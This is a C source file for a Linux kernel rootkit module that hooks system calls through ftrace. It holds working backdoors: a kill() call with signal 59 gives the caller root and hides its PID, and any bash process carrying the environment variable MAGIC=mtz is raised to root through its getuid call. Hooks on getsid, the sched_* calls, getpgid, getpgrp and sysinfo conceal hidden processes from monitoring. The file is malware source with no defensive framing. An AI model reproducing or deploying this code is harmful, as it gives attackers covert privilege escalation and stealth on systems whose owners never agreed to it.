#include "../include/core.h"
#include "../include/become_root.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *);
typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
static orig_getuid_t orig_getuid;

static asmlinkage long (*orig_getsid)(const struct pt_regs *);
static asmlinkage long (*orig_sched_getaffinity)(const struct pt_regs *);
static asmlinkage long (*orig_sched_getparam)(const struct pt_regs *);
static asmlinkage long (*orig_sched_getscheduler)(const struct pt_regs *);
static asmlinkage long (*orig_sched_rr_get_interval)(const struct pt_regs *);
static asmlinkage long (*orig_sysinfo)(const struct pt_regs *);

static notrace void SpawnRoot(void);
static notrace void rootmagic(void);

static inline bool should_hide_pid_by_int(int pid)
{
    int i;
    if (pid <= 0)
        return false;

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return true;
    }
    return false;
}

static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
    int pid = (int)regs->di;
    int signal = (int)regs->si;

    if (signal == 59) {
        SpawnRoot();
        add_hidden_pid(pid);
        return 0;
    }

    if (signal == 0 && should_hide_pid_by_int(pid)) {
        return -ESRCH;
    }

    if (!orig_kill)
        return -ENOSYS;

    return orig_kill(regs);
}


static notrace asmlinkage long hook_getsid(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    return orig_getsid(regs);
}

static notrace asmlinkage long hook_sched_getaffinity(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    return orig_sched_getaffinity(regs);
}

static notrace asmlinkage long hook_sched_getparam(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    return orig_sched_getparam(regs);
}

static notrace asmlinkage long hook_sched_getscheduler(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    return orig_sched_getscheduler(regs);
}

static notrace asmlinkage long hook_sched_rr_get_interval(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    return orig_sched_rr_get_interval(regs);
}

static notrace asmlinkage long hook_sysinfo(const struct pt_regs *regs)
{
    void __user *user_info = (void __user *)regs->di;
    long ret;

    if (!user_info)
        return orig_sysinfo(regs);

    ret = orig_sysinfo(regs);
    if (ret != 0)
        return ret;

    {
        struct sysinfo kinfo;
        if (copy_from_user(&kinfo, user_info, sizeof(kinfo)) != 0) {
            return ret;
        }

        if (hidden_count > 0 && kinfo.procs > hidden_count)
            kinfo.procs -= hidden_count;

        copy_to_user(user_info, &kinfo, sizeof(kinfo));
    }

    return ret;
}
static asmlinkage long (*orig_getpgid)(const struct pt_regs *);
static asmlinkage long (*orig_getpgrp)(const struct pt_regs *);

static notrace asmlinkage long hook_getpgid(const struct pt_regs *regs)
{
    int pid = (int)regs->di;

    if (pid == 0) {
        if (!current)
            return orig_getpgid(regs);
        pid = current->tgid;
    }

    if (should_hide_pid_by_int(pid))
        return -ENOENT;

    return orig_getpgid(regs);
}

static notrace asmlinkage long hook_getpgrp(const struct pt_regs *regs)
{
    if (current && should_hide_pid_by_int(current->tgid))
        return -ENOENT;

    return orig_getpgrp(regs);
}


static notrace asmlinkage long hook_getuid(const struct pt_regs *regs) {
    const char *name = current->comm;
    struct mm_struct *mm;
    char *envs;
    int len, i;

    if (strcmp(name, "bash") == 0) {
        mm = current->mm;
        if (mm && mm->env_start && mm->env_end) {
            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
            if (envs) {
                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
                if (len > 0) {
                    for (i = 0; i < len - 1; i++) {
                        if (envs[i] == '\0')
                            envs[i] = ' ';
                    }
                    if (strstr(envs, "MAGIC=mtz")) {
                        rootmagic();
                    }
                }
                kfree(envs);
            }
        }
    }

    return orig_getuid(regs);
}

static notrace void SpawnRoot(void) {
    struct cred *newcredentials;

    newcredentials = prepare_creds();
    if (!newcredentials)
        return;

    newcredentials->uid.val   = 0;
    newcredentials->gid.val   = 0;
    newcredentials->suid.val  = 0;
    newcredentials->sgid.val  = 0;
    newcredentials->fsuid.val = 0;
    newcredentials->fsgid.val = 0;
    newcredentials->euid.val  = 0;
    newcredentials->egid.val  = 0;

    commit_creds(newcredentials);
}

static notrace void rootmagic(void) {
    struct cred *creds = prepare_creds();
    if (!creds)
        return;

    creds->uid.val   = 0;
    creds->gid.val   = 0;
    creds->suid.val  = 0;
    creds->sgid.val  = 0;
    creds->fsuid.val = 0;
    creds->fsgid.val = 0;
    creds->euid.val  = 0;
    creds->egid.val  = 0;

    commit_creds(creds);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
    HOOK("__x64_sys_getpgid", hook_getpgid, &orig_getpgid),
    HOOK("__x64_sys_getpgrp", hook_getpgrp, &orig_getpgrp),
    HOOK("__x64_sys_getsid", hook_getsid, &orig_getsid),
    HOOK("__x64_sys_sched_getaffinity", hook_sched_getaffinity, &orig_sched_getaffinity),
    HOOK("__x64_sys_sched_getparam", hook_sched_getparam, &orig_sched_getparam),
    HOOK("__x64_sys_sched_getscheduler", hook_sched_getscheduler, &orig_sched_getscheduler),
    HOOK("__x64_sys_sched_rr_get_interval", hook_sched_rr_get_interval, &orig_sched_rr_get_interval),
    HOOK("__x64_sys_sysinfo", hook_sysinfo, &orig_sysinfo),
};

notrace int become_root_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void become_root_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
